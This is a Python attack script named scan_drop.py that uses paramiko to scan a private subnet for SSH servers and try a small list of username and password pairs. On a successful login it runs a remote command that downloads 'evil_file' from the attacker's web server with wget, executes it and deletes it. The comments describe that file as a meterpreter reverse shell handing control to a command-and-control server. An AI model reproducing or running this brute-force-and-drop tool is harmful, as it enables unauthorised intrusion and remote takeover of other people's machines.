import paramiko
import multiprocessing
import time
import warnings

# scan_drop.py functions
# 1. scans target network for nodes running ssh services on port 22.
# 2. if target found, dictionary attack.
# 3. if successful, RCE.
# 4. user@target# "wget" a file (evil_file) from our web server.
# 4. user@target# run payload.
# 5. user@target# delete payload & disconnect.

# evil_file functions
# 1. "evil_file" is a binary meterpreter tcp reverse shell to C&C.
# 2. C&C takes over while scan_drop.py disconnects.

# remove depracated warnings
warnings.filterwarnings(action='ignore',module='.*paramiko.*')

# small dictionary list
user_list = ['fresh1','fresh2','fresh3','fresh4']
pass_list = ['fresh4','fresh3','fresh2','fresh1']
jobs = []
num = 0
num2 = 0

def ssh_start():
    ip = "192.168.203.%d" % i
#    print "Connecting:", ip, user_list[num] + pass_list[num2]
    p = paramiko.SSHClient()
    p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        p.connect(ip, username=user_list[num], password=pass_list[num2])
        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/evil_file" -O /tmp ; chmod 755 /tmp/evil_file; /tmp/./evil_file; sleep 1; rm /tmp/evil_file')
        for line in stdout:
            print(line.strip('\n'))
        for line in stderr:
            print(line.strip('\n'))
    except paramiko.AuthenticationException:
            pass

for i in range(150,155):
    for num in range(0,4):
        for num2 in range(0,4):
            p = multiprocessing.Process(target=ssh_start)
            jobs.append(p)
            p.start()
            #p.join()
            num2 += 1
    num += 1
    time.sleep(1)
